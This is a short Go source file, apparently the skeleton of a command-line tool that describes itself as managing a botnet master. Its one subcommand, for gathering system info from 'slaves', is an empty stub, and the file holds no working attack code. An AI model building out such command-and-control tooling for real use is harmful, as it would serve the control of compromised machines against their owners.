package main

import (
	"fmt"
	"os"

	"github.com/urfave/cli"
)

var dryRun = false

func main() {
	app := cli.NewApp()
	app.Name = "master"
	app.EnableBashCompletion = true
	app.Usage = "CLI tool for managing a botnet master"

	app.CommandNotFound = func(c *cli.Context, command string) {
		fmt.Println("[ERROR] The command provided is not supported: ", command)
		c.App.Run([]string{"help"})
	}

	app.Version = "1.0"

	app.Flags = []cli.Flag{
		cli.BoolFlag{
			Name:        "dry-run",
			Usage:       "run the command in dry-run mode",
			Destination: &dryRun,
		},
	}

	sysinfo := cli.Command{
		Name:   "sysinfo",
		Usage:  "system info operations for slaves",
		Action: func(c *cli.Context) error { return nil },
		Flags: []cli.Flag{
			cli.StringFlag{
				Name:  "n-slaves",
				Usage: "maximum amount of slaves to query system info from",
				Value: "50",
			},
		},
	}

	app.Commands = []cli.Command{
		sysinfo,
	}

	if err := app.Run(os.Args); err != nil {
		fmt.Printf("\nError: %s \n", err)
		os.Exit(1)
	}
}
